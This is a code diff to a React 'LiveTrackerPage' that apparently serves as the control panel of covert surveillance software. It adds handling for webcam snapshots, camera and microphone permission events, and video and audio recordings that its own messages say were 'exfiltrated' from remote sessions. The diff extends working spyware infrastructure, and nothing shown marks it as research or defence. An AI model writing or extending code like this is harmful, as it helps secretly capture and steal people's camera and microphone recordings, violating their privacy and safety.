@@ -76,20 +76,33 @@ export default function LiveTrackerPage() {
       if (newEvent.sessionId === selectedSessionId) {
         if (newEvent.type === 'media-stream') {
             const { data } = newEvent;
-            if (data.type === 'image-snapshot') {
-                setLiveFeedSrc(data.snapshot);
-                setIsCameraActive(true);
-            } else if (data.type === 'status') {
-                if (data.message === 'Permissions granted.') {
-                    setIsCameraActive(true);
-                    setIsMicActive(true);
-                } else if (data.message === 'Stream stopped.') {
-                    setIsCameraActive(false);
-                    setIsMicActive(false);
-                    setLiveFeedSrc(null);
-                } else {
-                    toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${newEvent.sessionId} reported: ${data.message}`});
-                }
+            switch(data.type) {
+                case 'image-snapshot':
+                    setLiveFeedSrc(data.snapshot);
+                    setIsCameraActive(true); // Keep active as long as snapshots come in
+                    break;
+                case 'video/webm':
+                case 'audio/webm':
+                    toast({ title: "Recording Received", description: `A ${data.type} recording was exfiltrated.`});
+                    break;
+                case 'status':
+                    if (data.message === 'Permissions granted.') {
+                        setIsCameraActive(true);
+                        setIsMicActive(true);
+                        toast({ title: 'Permissions Granted', description: `Session ${newEvent.sessionId} has camera/mic access.`});
+                    } else if (data.message === 'Stream stopped.') {
+                        setIsCameraActive(false);
+                        setIsMicActive(false);
+                        setLiveFeedSrc(null);
+                        setIsRecording(null);
+                        toast({ variant: 'destructive', title: 'Stream Stopped', description: `Session ${newEvent.sessionId} has stopped the media stream.`});
+                    } else {
+                        toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${newEvent.sessionId} reported: ${data.message}`});
+                    }
+                    break;
+                default:
+                    // This could be for other media types like downloaded images etc.
+                    toast({ title: 'Media Received', description: `Received media of type ${data.type}`});
             }
         }
       }
